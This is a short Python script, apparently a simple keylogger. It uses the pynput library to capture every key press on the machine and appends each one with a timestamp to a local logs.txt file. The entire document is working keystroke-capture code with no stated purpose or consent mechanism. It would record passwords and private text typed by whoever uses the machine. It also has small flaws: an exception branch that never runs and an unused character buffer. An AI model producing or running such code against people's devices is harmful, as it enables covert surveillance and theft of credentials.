from pynput.keyboard import Key, Listener
import os
from datetime import datetime

# Define the file path for the log file
log_file = os.path.join(os.path.dirname(__file__), 'logs.txt')
typed_chars = []


# Function to handle key press events
def on_press(key):
    global typed_chars
    with open(log_file, 'a') as f:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        try:
            char = getattr(key, 'char', None)
            if char is not None:
                f.write(f'{timestamp} {char}\n')
                typed_chars.append(char)
            else:
                f.write(f'{timestamp} {key}\n')
                typed_chars.append(str(key))
        except AttributeError:
            if key == Key.space:
                f.write(f'{timestamp} \n')
                typed_chars.append(' ')
            elif key == Key.enter:
                f.write(f'{timestamp} \n')
                typed_chars = []
            else:
                f.write(f'{timestamp} {key.name}\n')
                typed_chars.append(f'{key.name}')


with open(log_file, 'a') as f:
    f.write('\n')

# listener to capture keystrokes
with Listener(on_press=on_press) as listener:
    listener.join()